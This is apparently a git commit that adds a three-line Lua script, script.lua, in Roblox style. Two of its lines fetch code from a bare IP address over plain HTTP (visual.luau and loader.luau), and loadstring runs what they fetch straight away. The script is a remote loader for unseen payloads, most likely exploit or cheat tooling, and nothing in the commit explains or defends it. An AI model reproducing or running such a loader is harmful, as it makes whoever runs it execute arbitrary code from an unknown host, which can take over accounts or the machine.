20bf7475072f8e01fede67a82ce98216fe2949f3
BixieScriptS <maigueljoshgrabee@gmail.com>
2026-02-13 17:09:05 +0800

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,3 @@
+ID="56d46133-696d-430a-85b0-823f4f72fe72";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
